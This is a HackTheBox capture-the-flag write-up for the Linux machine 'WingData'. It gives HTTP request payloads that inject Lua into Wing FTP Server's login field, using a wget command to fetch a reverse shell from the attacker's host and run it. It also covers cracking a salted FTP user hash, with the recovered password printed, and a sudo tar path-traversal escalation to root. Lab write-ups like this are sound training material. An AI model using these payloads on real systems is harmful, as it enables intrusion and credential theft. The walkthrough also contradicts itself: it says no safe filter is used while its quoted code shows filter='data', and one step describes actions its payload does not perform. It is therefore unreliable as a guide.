# WingData - HackTheBox

**OS:** Linux
**Difficulty:** Medium
**Flags:**
- user.txt: [not recorded]
- root.txt: [not recorded]

---

## Summary

WingData runs Wing FTP Server (Free Edition). The login endpoint passes the username field into a Lua `os.execute()` call after minimal parsing, allowing command injection via a null byte and Lua comment escape. This gives a shell as the FTP service user. A salted password hash in the FTP user XML files cracks to give SSH access as a second user. That user can run a Python restore script as root via sudo, which uses Python's `tarfile.extractall()` without a safe filter, making it vulnerable to a tar path traversal attack.

---

## Recon

Add `ftp.wingdata.htb` to `/etc/hosts`. The target runs Wing FTP Server on HTTPS.

---

## Foothold - Lua Injection via Username Field

The Wing FTP Server login handler passes the username to a Lua script. Injecting a null byte (`%00`) terminates the expected string processing and the remainder is interpreted as raw Lua. Using `]]` closes any open long string, and `os.execute()` runs system commands.

**Step 1 - Download a reverse shell**

Set up a listener and a Python HTTP server locally:

```bash
nc -lvnp 4444
python3 -m http.server 8000
```

Send the injection to download the shell:

```http
POST /loginok.html HTTP/1.1
Host: ftp.wingdata.htb
Content-Length: 88

username=anonymous%00]] os.execute('wget http://10.10.15.224:8000/rev2.sh') --&password=
```

The login returns a `UID` session cookie. Use that cookie to trigger execution of the queued Lua command:

```http
POST /dir.html HTTP/1.1
Host: ftp.wingdata.htb
Cookie: UID=<cookie from above>
Content-Length: 0
```

**Step 2 - Execute the shell**

Repeat the injection to move the file to `/tmp`, set permissions, and execute:

```http
POST /loginok.html HTTP/1.1
Host: ftp.wingdata.htb
Content-Length: 73

username=anonymous%00]] os.execute('/bin/bash /tmp/rev2.sh') --&password=
```

Trigger execution again via `POST /dir.html` with the new UID cookie. Shell arrives as the `wingdata` user.

---

## Lateral Movement - Cracking the FTP User Hash

FTP user accounts are stored as XML files under `/opt/wftpserver/Data/1/users/`. Each file contains a salted password hash:

```bash
ls /opt/wftpserver/Data/1/users/
# anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml

cat /opt/wftpserver/Data/1/users/wacky.xml
# <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

The global settings file reveals the salt:

```bash
cat /opt/wftpserver/Data/1/settings.xml | grep Salt
# <SaltingString>WingFTP</SaltingString>
```

The hash is SHA-256(password + salt). Crack it with hashcat using mask mode to append the known salt:

```bash
hashcat -m 1400 -a 6 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca \
  /usr/share/wordlists/rockyou.txt 'WingFTP'
```

Result: `!#7Blushing^*Bride5`

SSH in as `wacky`.

---

## Privilege Escalation - Tar Path Traversal via sudo

Check sudo permissions:

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script takes a backup tarball and extracts it to a staging directory. The vulnerable section:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

Python's `tarfile` `filter="data"` is intended to be safe but the implementation in this version can be bypassed. Craft a malicious tar that contains a path traversal entry (e.g. a symlink or `../../` path) to write files outside the staging directory.

A pre-built exploit script (`rootexploit.py`) is available in the working directory. Run it to create the malicious tar, then execute the sudo command:

```bash
python3 rootexploit.py

sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_1001.tar \
  -r restore_poc
```

This writes a payload to a root-owned path and escalates to root.

---

## Key Takeaways

- Null byte injection is a classic technique for breaking out of string handling in languages that use C-style null termination or pattern matching - always test `%00` in fields that feed into scripting interpreters
- FTP server user data and configuration files are worth reading once you have a foothold - they often contain password material in formats that are crackable
- Python's `tarfile.extractall()` has a long history of path traversal vulnerabilities. Even with `filter="data"`, the behaviour depends on the Python version. Any sudo rule allowing tar extraction with a wildcard path argument is a high-value privilege escalation target
